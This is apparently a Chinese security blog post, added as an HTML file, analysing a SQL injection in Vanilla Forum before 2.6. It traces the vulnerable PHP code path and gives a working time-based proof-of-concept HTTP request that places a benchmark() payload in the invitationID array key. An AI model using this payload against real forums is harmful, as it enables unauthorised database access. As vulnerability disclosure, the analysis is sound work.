@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Vanilla SQL Injection Vulnerability -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Tr3jer_CongRong.'s RSS Feed" href="/rss.xml">
+<link rel="alternate" type="application/atom+xml" title="Tr3jer_CongRong.'s Atom Feed" href="/atom.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+<link rel="license" type="text/plain" src="/statics/LICENSE">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+		<!-- <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li> -->
+	</ul>
+</nav>
+
+		<main>
+			<div class="post-content">
+<div id="post">
+  <h1 align="center">Vanilla SQL Injection Vulnerability</h1>
+<p align="right" class="date">02 Oct 2018 - Balis0ng</p>
+
+<h2 id="简介">简介</h2>
+
+<p>   Vanilla是国外的一个论坛程序，是一款开源的PHP程序。github地址为:https://github.com/vanilla/vanilla 在Vanilla Forum 2.6之前，存在一个SQL注入漏洞，攻击者只需要注册登录一个会员即可利用该漏洞。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>首先在applications/dashboard/controllers/class.profilecontroller.php:274</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function deleteInvitation($invitationID) {
+        $this-&gt;permission('Garden.SignIn.Allow');
+
+        if (!$this-&gt;Form-&gt;authenticatedPostBack()) {
+            throw forbiddenException('GET');
+        }
+
+        $invitationModel = new InvitationModel();
+        $invitationModel-&gt;delete($invitationID);
+        $this-&gt;informMessage(t('The invitation was removed successfully.'));
+        $this-&gt;jsonTarget(".js-invitation[data-id=\"{$invitationID}\"]", '', 'SlideUp');
+
+        $this-&gt;render('Blank', 'Utility');
+    }
+</code></pre></div></div>
+
+<p>这个函数有个形参$invitationID，这个值其实是我们通过URL传递进来的，是我们可控的，并且这里需要注意的是，该值是可以为一个数组。</p>
+
+<p>首先该函数第一行判断了权限，需要登录。</p>
+
+<p>第二行是一个csrf token的判断，利用这个漏洞不能直接发POST包。</p>
+
+<p>然后下面就到了关键的地方，可以看到这里将$invitationID带入到了delete函数中，我们跟踪一下该函数。</p>
+
+<p>applications/dashboard/models/class.invitationmodel.php:225</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function delete($where = [], $options = []) {
+    if (is_numeric($where)) {
+        deprecated('InvitationModel-&gt;delete(int)', 'InvitationModel-&gt;deleteID(int)');
+        $result = $this-&gt;deleteID($where, $options);
+        return $result;
+    }
+    parent::delete($where, $options);
+}
+</code></pre></div></div>
+
+<p>   这里的参数$where就是我们上文的$invitationID，是可控的，然后这里又将$where带入到了另外一个delete函数中，继续追踪。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function delete($where = [], $options = []) {
+    if (is_numeric($where)) {
+        deprecated('Gdn_Model-&gt;delete(int)', 'Gdn_Model-&gt;deleteID()');
+        $where = [$this-&gt;PrimaryKey =&gt; $where];
+    }
+
+    $resetData = false;
+    if ($options === true || val('reset', $options)) {
+        deprecated('Gdn_Model-&gt;delete() with reset true');
+        $resetData = true;
+    } elseif (is_numeric($options)) {
+        deprecated('The $limit parameter is deprecated in Gdn_Model-&gt;delete(). Use the limit option.');
+        $limit = $options;
+    } else {
+        $options += ['rest' =&gt; true, 'limit' =&gt; null];
+        $limit = $options['limit'];
+    }
+
+    if ($resetData) {
+        $result = $this-&gt;SQL-&gt;delete($this-&gt;Name, $where, $limit);
+    } else {
+        $result = $this-&gt;SQL-&gt;noReset()-&gt;delete($this-&gt;Name, $where, $limit);
+    }
+    return $result;
+}
+</code></pre></div></div>
+
+<p>然后该函数中又将$where带入到了$this-&gt;SQL-&gt;noReset()-&gt;delete函数中，继续追踪。</p>
+
+<p>library/database/class.sqldriver.php:333</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function delete($table = '', $where = '', $limit = false) {
+	if ($table == '') {
+	    if (!isset($this-&gt;_Froms[0])) {
+	        return false;
+	    }
+
+	    $table = $this-&gt;_Froms[0];
+	} elseif (is_array($table)) {
+	    foreach ($table as $t) {
+	        $this-&gt;delete($t, $where, $limit, false);
+	    }
+	    return;
+	} else {
+	    $table = $this-&gt;escapeIdentifier($this-&gt;Database-&gt;DatabasePrefix.$table);
+	}
+
+	if ($where != '') {
+	    $this-&gt;where($where);
+	}
+
+	if ($limit !== false) {
+	    $this-&gt;limit($limit);
+	}
+
+	if (count($this-&gt;_Wheres) == 0) {
+	    return false;
+	}
+
+	$sql = $this-&gt;getDelete($table, $this-&gt;_Wheres, $this-&gt;_Limit);
+
+	return $this-&gt;query($sql, 'delete');
+	}
+</code></pre></div></div>
+
+<p>   该函数中对我们传递进来的$where有个判断和操作，如果不为空，就带入到where函数中去，跟踪一下该函数。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
+    if (!is_array($field)) {
+        $field = [$field =&gt; $value];
+    }
+
+    foreach ($field as $subField =&gt; $subValue) {
+        if (is_array($subValue)) {
+            if (count($subValue) == 1) {
+                $firstVal = reset($subValue);
+                $this-&gt;where($subField, $firstVal);
+            } else {
+                $this-&gt;whereIn($subField, $subValue);
+            }
+        } else {
+            $whereExpr = $this-&gt;conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
+            if (strlen($whereExpr) &gt; 0) {
+                $this-&gt;_where($whereExpr);
+            }
+        }
+    }
+    return $this;
+}
+</code></pre></div></div>
+
+<p>   这里其实就是一个组装where语句的函数，由于$where我们可控制，导致这里组装后的where语句的字段处也可以控制，所以就产生了一个SQL注入漏洞。</p>
+
+<h2 id="漏洞证明">漏洞证明</h2>
+
+<p>   该漏洞利用需要用户登陆，因为是论坛，所以注册登录不是什么难事。
+开头提了一下，由于有CSRF TOKEN的校验，所以不能直接发POST包，但是我们可以随便点击论坛一个正常的POST请求，然后用Burpsuite来改即可。
+这里我使用的是延时注入，用的是benchmark函数。不同环境的延时时间也不一样的。
+附上POC:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
+Host: localhost
+Content-Length: 29
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://localhost
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://localhost/profile/
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119
+Connection: close
+
+TransientKey=caEyM0dSVZC0xDhU
+</code></pre></div></div>
+
+<p>然后这里延时了9秒。如图所示:</p>
+
+<p><img src="https://i.loli.net/2018/11/30/5c01538e4cdf6.jpg" /></p>
+
+<h2 id="结语">结语</h2>
+
+<p>   其实这种漏洞很常见，很多程序在处理SQL语句的时候，都采用的这种写法，当然这种写法是没错的。主要还是因为开发人员太信任外部的输入了。</p>
+
+<p>该程序在该版本相同类型的漏洞还有一个，大家有兴趣的话可以自己找一找。(当然我已经提交给厂商啦。)</p>
+
+</div>
+</div>
+
+<div style="display: none;">
+	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+</div>
+		</main>
+		<!-- <footer>
+
+</footer>
+ -->
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
